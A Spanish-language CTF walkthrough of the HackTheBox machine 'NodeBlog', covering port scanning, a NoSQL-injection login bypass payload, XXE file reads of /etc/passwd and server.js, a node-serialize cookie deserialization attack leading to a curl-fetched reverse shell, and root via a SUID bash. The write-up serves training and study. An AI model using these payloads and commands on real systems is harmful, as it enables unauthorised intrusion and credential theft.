---
title: HTB - NodeBlog
published: true
categories: [Linux]
tags: [eJPT, eWPT, Fácil]
---


<img src="/assets/HTB/NodeBlog/nodeblog.png">


¡Hola!
Vamos a resolver de la máquina `NodeBlog` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **NoSQL Injection (Authentication Bypass)**
- **XXE File Read**
- **NodeJS Deserialization Attack (IIFE Abusing)**
- **Mongo Database Enumeration**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `NodeBlog`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.139
PING 10.10.11.139 (10.10.11.139) 56(84) bytes of data.
64 bytes from 10.10.11.139: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.11.139 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.139 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
nmap -sCV -p22,5000 10.10.11.139 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.11.139:5000
http://10.10.11.139:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Accedemos al servicio HTTP por le puerto 5000 y examinamos su contenido. Vemos lo que parece ser un artículo de un blog y un botón de login

<img src="/assets/HTB/NodeBlog/web.png">

Sabemos que estamos ante `NodeJS` por lo que trataremos de ver si es vulnerable a inyecciones NoSQL. Accedemos a `PayloadAllTheThings` para buscar posibles payloads

<img src="/assets/HTB/NodeBlog/nosql.png">

Accedemos al panel de login e interceptamos petición con BurpSuite. Cambiamos el `Content-Type` a `application/json` y aplicamos payload `{"user":"admin", "password":{"$ne":"test"}}`

<img src="/assets/HTB/NodeBlog/payload.png">

Redirigimos respuesta a navegador y logramos hacer bypass del panel de login

<img src="/assets/HTB/NodeBlog/login.png">

Vemos un botón `upload` que nos permite subir ficheros. Creamos un archivo txt y tratamos de subirlo. Nos da un error, parece ser que el archivo tiene que estar en formato `XML`. Si observamos el código fuente del error podemos ver cómo debería ser la estructura correcta

<img src="/assets/HTB/NodeBlog/xmlerror.png">
<img src="/assets/HTB/NodeBlog/example.png">

Creamos un archivo `XML` según la estructura de ejemplo del error y la subimos

<img src="/assets/HTB/NodeBlog/xmltest.png">
<img src="/assets/HTB/NodeBlog/xmlok.png">

Vemos que cuando le envías una estructura XML válida la parsea correctamente según las etiquetas. Modificamos nuestro archivo agregándole las cabeceras necesarias para acontecer un ataque `XXE`, enviamos y vemos en el output del formulario que tenemos acceso al archivo `/etc/passwd`

<img src="/assets/HTB/NodeBlog/xxefile.png">
<img src="/assets/HTB/NodeBlog/passwd.png">

Ya que tenemos capacidad de listar archivos de la máquina mediante XXE procedemos a listar puertos internos abiertos que inicialmente no son visibles de forma externa, para ello listamos el contenido del archivo `/proc/net/tcp`

<img src="/assets/HTB/NodeBlog/procnettcp.png">

Nos copiamos el contenido en nuestro equipo para filtrar la información obtenida

```bash
❯ for port in $(cat data | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] Port $port -> $(echo "obase=10; ibase=16; $port" | bc)"; done
[+] Port 0016 -> 22
[+] Port 0035 -> 53
[+] Port 6989 -> 27017
[+] Port BA9C -> 47772
[+] Port BA9E -> 47774
[+] Port BAA0 -> 47776
```

Sabemos que tenemos NodeJS corriendo el cual interpreta `json`. Si reproducimos deliberadamente un error de sintaxis en BurpSuite observamos en la respuesta rutas del sistema. Observamos una ruta interesante `/opt/blog`

<img src="/assets/HTB/NodeBlog/opt.png">

Por convención es típico que en la raíz de proyectos en NodeJS contengan un archivo `server.js` el cual nos puede arrojar información interesante. Modificamos nuestro archivo XML para que nos muestre el contenido de `/opt/blog/server.js`

<img src="/assets/HTB/NodeBlog/serverjs.png">

Nos llama la atención que se importa `node-serialize`. Vemos una función `authenticated` que recibe un parámetro `c`. La función se encarga de deserializar la información contenida en el parámetro `c`. Esto nos lleva a pensar que `c` son los datos serializados que se encuentran en la cookie de sesión. Buscamos en Google por ataques de deserialización para NodeJS y encontramos este recurso de [OPSECX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). Encontramos payload a sustituir en la cookie de sesión

<img src="/assets/HTB/NodeBlog/cookie.png">

Copiamos payload a decoder de Burpsuite, eliminamos saltos de línea y tabulaciones. Cambiamos el comando a ejecutar por `ping -c 1 10.10.14.34` y codificamos en URL

<img src="/assets/HTB/NodeBlog/encoder.png">

Vamos a la página principal de la web y en el Inspector del navegador nos dirigimos a `Almacenamiento` -> `Cookies` y sustituimos el valor por el generado por Burpsuite. Con `tcpdump` nos ponemos en escucha de trazas ICMP y recargamos la web. Observamos que nos llegan las trazas ICMP

<img src="/assets/HTB/NodeBlog/desser.png">

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:49:14.758083 IP 10.129.176.124 > 10.10.14.34: ICMP echo request, id 1, seq 1, length 64
11:49:14.758106 IP 10.10.14.34 > 10.129.176.124: ICMP echo reply, id 1, seq 1, length 64
```

Ya sabemos que tenemos capacidad de ejecución remota de comandos a través de un ataque de deserializción. Creamos `index.html` con oneliner para entablar reverse shell, lo compartimos a través de un servidor web con python, nos ponemos en escucha en el puerto 443. En el payload sustituimos el ping por un curl a nuestra dirección IP y sustitimos cookie de sesión. Al recargar la página obetenemos acceso a la máquina víctima

<img src="/assets/HTB/NodeBlog/payloadrevshell.png">
<img src="/assets/HTB/NodeBlog/revshell.png">

Somos usuario `admin`. Nos dirigimos a nuestro directorio personal pero no tenemos permisos para acceder sólo de lectura. Sin embargo somos los propietarios por lo que podemos cambiar permisos a nuestro antojo. Damos permisos de ejecución a la carpeta y ya podemos acceder y visualizar la flag de usuario

```bash
admin@nodeblog:/home$ ls admin/
user.txt
admin@nodeblog:/home$ cat admin/user.txt 
cat: admin/user.txt: Permission denied
admin@nodeblog:/home$ chmod +x admin/
admin@nodeblog:/home$ cd admin/
admin@nodeblog:~$ cat user.txt 
1a17087a8fedf11d***************
```

### Escalada Privilegios

* * *

Anteriormente cuando filtramos los puertos internos abiertos vimos que el puerto 27017 estaba abierto. Es el puerto por defecto de `MongoDB`. Mediante el comando `mongo` accedemos a la consola de la base de datos

```bash
admin@nodeblog:~$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("783344f4-3976-4db2-9403-29bb7ffdfee9") }
MongoDB server version: 3.6.8
Server has startup warnings: 
2022-12-14T12:37:01.867+0000 I CONTROL  [initandlisten] 
2022-12-14T12:37:01.869+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-12-14T12:37:01.869+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-12-14T12:37:01.869+0000 I CONTROL  [initandlisten] 
```

Listando bases de datos encontramos `blog`. Listando colecciones vemos `users`. Listando el contenido encontramos unas credenciales

```bash
> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
> use blog
switched to db blog
> show collections
articles
users
> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

Confirmamos que la password conrresponde al usuario `admin`. Listamos privilegios de sudo aportando la password encontrada y vemos que podemos ejecutar TODO

```bash
admin@nodeblog:~$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

Asignamos a la bash privilegios SUID y mediante `bash -p` nos lanzamos una bash con privilegios de root. La flag la encontramos en el directorio `/root`

```bash
admin@nodeblog:~$ sudo chmod u+s /bin/bash
admin@nodeblog:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
8d41f47e8acc5d170****************
```

Hemos completado la máquina **NodeBlog** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/NodeBlog/pwned.png">